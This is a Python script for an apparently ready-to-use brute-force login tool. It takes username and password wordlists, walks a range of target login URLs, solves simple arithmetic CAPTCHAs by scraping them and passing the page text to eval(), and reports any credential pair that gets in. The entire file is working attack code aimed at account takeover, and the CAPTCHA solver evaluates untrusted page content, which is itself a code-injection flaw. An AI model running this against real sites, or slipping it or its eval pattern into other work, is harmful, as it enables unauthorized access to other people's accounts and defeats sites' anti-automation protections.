import requests
from bs4 import BeautifulSoup
import argparse
import time
import os
import re
from datetime import datetime

# --- Parse Arguments ---
parser = argparse.ArgumentParser(description="Smart Brute-Force Tool with CAPTCHA Solver")
parser.add_argument('-u', '--userlist', required=True, help='Path to usernames file')
parser.add_argument('-p', '--passlist', required=True, help='Path to passwords file')
parser.add_argument('-t', '--target', required=True, help='Target login URL (supports {n..m} format)')
args = parser.parse_args()

# --- Constants ---
username_field = 'username'
password_field = 'password'
captcha_field = 'captcha'
success_flag = 'Welcome'  # Change this based on your target app

# --- Logging Setup ---
timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
os.makedirs('logs', exist_ok=True)
log_file = f"logs/brute_log_{timestamp}.txt"

def log(msg):
    print(msg)
    with open(log_file, 'a') as f:
        f.write(msg + '\n')

# --- Wordlist Loading ---
with open(args.userlist, 'r') as f:
    usernames = [line.strip() for line in f if line.strip()]

with open(args.passlist, 'r') as f:
    passwords = [line.strip() for line in f if line.strip()]

# --- URL Expansion ---
def expand_url_format(url):
    match = re.search(r'\{(\d+)\.\.(\d+)\}', url)
    if not match:
        return [url]  # static URL

    start, end = int(match.group(1)), int(match.group(2))
    width = len(match.group(1))  # handle padding
    urls = []

    for i in range(start, end + 1):
        padded = str(i).zfill(width)
        expanded = re.sub(r'\{\d+\.\.\d+\}', padded, url)
        urls.append(expanded)

    return urls

target_urls = expand_url_format(args.target)

# --- Captcha Solver ---
def solve_captcha(html):
    soup = BeautifulSoup(html, 'html.parser')
    label = soup.find('label')
    if label and 'solve' in label.text.lower():
        challenge = label.text.split(':')[-1].strip().replace('=', '').replace('?', '')
        try:
            answer = str(eval(challenge))
            return answer
        except:
            return ''
    return ''

# --- Brute-Force Loop ---
session = requests.Session()

for url in target_urls:
    log(f"\n[🔍] Trying URL: {url}")
    for username in usernames:
        log(f"[*] User: {username}")
        for password in passwords:
            captcha_value = ''
            payload = {
                username_field: username,
                password_field: password
            }

            try:
                get_resp = session.get(url, timeout=5)
            except requests.RequestException as e:
                log(f"[!] Skipping {url}: {e}")
                break

            if "captcha" in get_resp.text.lower():
                captcha_value = solve_captcha(get_resp.text)
                payload[captcha_field] = captcha_value

            try:
                resp = session.post(url, data=payload, timeout=5)
            except requests.RequestException:
                log(f"[!] POST failed for {url}")
                continue

            if success_flag in resp.text:
                log(f"[✅] SUCCESS: {username} / {password} at {url}")
                exit(0)
            else:
                log(f"[-] Failed: {username} / {password} | Captcha: {captcha_value if captcha_value else 'N/A'}")

log("[✘] Brute-force complete. No valid credentials found.")
